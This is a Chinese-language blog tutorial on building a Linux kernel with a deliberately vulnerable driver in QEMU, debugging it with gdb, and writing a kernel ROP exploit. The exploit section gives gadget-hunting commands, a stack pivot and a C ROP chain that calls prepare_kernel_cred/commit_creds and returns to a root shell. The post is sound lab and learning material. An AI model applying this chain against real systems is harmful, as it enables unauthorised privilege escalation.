---
layout: post
title: 使用QEMU进行内核ROP漏洞利用以及调试
description: "kernel相关cve复现基础"
category: develop
tags: [kernel, debug, qemu]
imagefeature: http://7xwdx7.com1.z0.glb.clouddn.com/5551e1cabd3bb.jpg
comments: true
share: true
---


# 使用QEMU进行内核ROP漏洞利用以及调试

### 基本配置

* busybox编译：

以busybox-1.25.0版本[^1]为例，下载源码安装文件

[^1]: <https://busybox.net/downloads/busybox-1.25.0.tar.bz2>

make menuconfig

选择Build BusyBox as a static binary (no shared libs)           //静态方式编译
去除Networking Utilities  netd                      //去掉inetd

make install

在_install目录下会生成最终的文件目录

* kernel内核编译

下载对应版本的内核源码，将我们自定义的内核驱动代码加入其中。

创建路径drivers/mydrv，将自行开发的内核驱动代码放置到该目录下。

创建Kconfig文件，文件内容如下：

{% highlight shell %}

menu "My-driver"
comment "my vulnerable driver"

config MY_DRIVER
    tristate "my_driver DriTst"
    help
    this is my driver test programming
endmenu

{% endhighlight %}

创建Makefile文件，文件内容如下:

{% highlight shell %}

obj-$(CONFIG_MY_DRIVER) += drv.o

{% endhighlight %}

完成文件目录中的配置后，继续修改上级drivers目录下的Kconfig文件和Makefile文件

Kconfig文件在最后添加

{% highlight shell %}

source "drivers/mydrv/Kconfig"

{% endhighlight %}

Makefile文件在最后添加

{% highlight shell %}

obj-$(CONFIG_MY_DRIVER)    += mydrv/

{% endhighlight %}

随后运行make menuconfig

选中Device Driver --->  my_driver ---->  my_driver DriTst
并保存配置

最后运行make bzImage 生成内核镜像文件。

* qemu安装：

sudo apt-get install qemu

创建rootfs的脚本creatfs.sh内容如下：

{% highlight shell %}

#!/bin/sh
KERNEL=$(pwd)
BUSYBOX=$(find busybox* -maxdepth 0)
LINUX=$(find linux* -maxdepth 0)

#create filesystem
cd $BUSYBOX/_install
mkdir -pv proc sys dev etc etc/init.d      //先创建系统目录
cat << EOF > etc/init.d/rcS                //生成rcS文件
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
/sbin/mdev -s
EOF

chmod 777 ./etc/init.d/rcS                //修改rcS权限
cd -

#create cpio img
cd $BUSYBOX/_install
find . | cpio -o --format=newc > $KERNEL/rootfs.img  
cd -

#create zip img
cd $KERNEL
gzip -c rootfs.img > rootfs.img.gz

{% endhighlight %}


qemu启动脚本内容如下：

{% highlight shell %}

#!/bin/sh
LINUX=$(find linux* -maxdepth 0)
#启动qemu
if [ $# = 0 ] ; then
    qemu-system-x86_64 -kernel $LINUX/arch/x86_64/boot/bzImage -initrd rootfs.img.gz -append "root=/dev/ram rdinit=sbin/init noapic"
fi

if [ "$1" = "s" ] ; then
    qemu-system-x86_64 -s -S -kernel $LINUX/arch/x86_64/boot/bzImage -initrd rootfs.img.gz -append "root=/dev/ram rdinit=sbin/init noapic"
fi

{% endhighlight %}

在完成以上配置后，可以直接运行./start.sh 启动内核，也可以通过./start.sh s来开启调试模式。可以使用gdb连接本地1234端口进行动态调试。

* gdb调试：

gdb可以在启动后通过命令 target remote 127.0.0.1:1234来连接qemu进行调试。同时也可以通过file vmlinux 命令来加载内核的symbol。

在实际使用中，可能会遇到Remote 'g' packet reply is too long 的报错。

此时需要重新编译gdb源码来进行patch。

首先 sudo apt-get source gdb获得当前gdb的源码，在目录/var/cache/apt/archives/下找到源码并修改gdb/remote.c文件中的static void
process_g_packet (struct regcache *regcache)函数

原始代码

{% highlight c %}

if (buf_len > 2 * rsa->sizeof_g_packet)
error (_("Remote 'g' packet reply is too long: %s"), rs->buf);

{% endhighlight %}

修改后代码

{% highlight c %}

if (buf_len > 2 * rsa->sizeof_g_packet) {
    rsa->sizeof_g_packet = buf_len;
    for (i = 0; i < gdbarch_num_regs (gdbarch); i++)
    {
        if (rsa->regs[i].pnum == -1)
            continue;
        if (rsa->regs[i].offset >= rsa->sizeof_g_packet)
            rsa->regs[i].in_g_packet = 0;
        else
            rsa->regs[i].in_g_packet = 1;
    }
}

{% endhighlight %}

重新./configure  make  make install， 生成的bin文件在/usr/local/bin/目录下，可以将gdb覆盖到/usr/bin/完成patch

这样再次连接qemu的本地1234调试端口，即可正常patch了。

### 内核rop漏洞利用

对内核ROP的学习可以参考freebuf上翻译的两篇文章：
http://www.freebuf.com/articles/system/94198.html
http://www.freebuf.com/articles/system/135402.html

这个案例实现了一个存在栈溢出漏洞的内核模块，并通过ioctl的方式在用户态对内核进行攻击从而提升权限获取Root。

首先还是按照文章中的内容对内核镜像进行解压，寻找ROP gadget。具体步骤如下：
{% highlight shell %}

./extract-vmlinux linux-3.14.75/arch/x86/boot/bzImage > vmlinux
./ROPgadget.py --binary ./vmlinux > ropgadget
grep  ': pop rdi ; ret' ropgadget

{% endhighlight %}

通过这种方式，可以找到如下对应的ROP：

0xffffffff810d2f82 : pop rdi ; ret
0xffffffff81017ed7 : mov rdi, rax ; call rdx
0xffffffff81060d62 : pop rdx ; ret

随后，对linux kernel的内核符号进行查询：
{% highlight shell %}

cat /proc/kallsyms | grep  'prepare_kernel_cred'
cat /proc/kallsyms | grep  'commit_creds'

{% endhighlight %}

获取内核符号地址：
0xffffffff8109ea20  prepare_kernel_cred
0xffffffff8109e6e0  commit_creds

接下来需要寻找用来进行stack pivot的指令来将rsp寄存器设置为一个可控的值，并通过mmap的方式将ROP gadget写入对应的栈地址。这里需要注意保证8字节的对齐来确保可以通过offset正确的跳转到stack pivot指令。

利用案例提供的工具脚本可以找到一个可用的stack pivot指令以及对应的栈地址：

{% highlight shell %}

addr(ops) = ffffffff821a0440
cat ropgadget | grep ': xchg eax, esp ; ret' > gadgets
./find_offset.py 0xffffffff821a0440 ./gadgets

offset = 18446744073707465188
gadget = xchg eax, esp ; ret 0x148d
stack addr = 811b5360

{% endhighlight %}

最后需要构造一个iret的栈布局来确保控制流从内核空间正确返回到用户空间。

iretq指令的获取命令如下：
{% highlight shell %}

objdump -j .text -d ~/vmlinux | grep iretq | head -1

{% endhighlight %}

这里要注意的是vmlinux必须是从内核bzImage镜像解压出来的，如果不是一一匹配的bin文件，那么获取的iretq地址将会错误，导致ROP链并没有真正执行iretq指令。

栈空间的布局可以见案例中代码（当然所有的offset、codebase都需要根据特定的内核binary进行重新计算）：

{% highlight c %}

save_state();

fake_stack = (unsigned long *)(stack_addr);

*fake_stack ++= 0xffffffff810c9ebdUL; /* pop %rdi; ret */

fake_stack = (unsigned long *)(stack_addr + 0x11e8 + 8);

*fake_stack ++= 0x0UL;                  /* NULL */
*fake_stack ++= 0xffffffff81095430UL;   /* prepare_kernel_cred() */
*fake_stack ++= 0xffffffff810dc796UL;   /* pop %rdx; ret */
*fake_stack ++= 0xffffffff81095196UL;   /* commit_creds() + 2 instructions */
*fake_stack ++= 0xffffffff81036b70UL;   /* mov %rax, %rdi; call %rdx */

*fake_stack ++= 0xffffffff81052804UL;   /* swapgs ; pop rbp ; ret */
*fake_stack ++= 0xdeadbeefUL;           /* dummy placeholder */

*fake_stack ++= 0xffffffff81053056UL;   /* iretq */
*fake_stack ++= (unsigned long)shell;   /* spawn a shell */
*fake_stack ++= user_cs;                /* saved CS */
*fake_stack ++= user_rflags;            /* saved EFLAGS */
*fake_stack ++= (unsigned long)(temp_stack+0x5000000);  /* mmaped stack region in user space */
*fake_stack ++= user_ss;                /* saved SS */

{% endhighlight %}

最后，看一下利用qemu运行kernel rop代码的效果：
![kernel-rop](http://7xwdx7.com1.z0.glb.clouddn.com/qemu-kernel-rop.png)
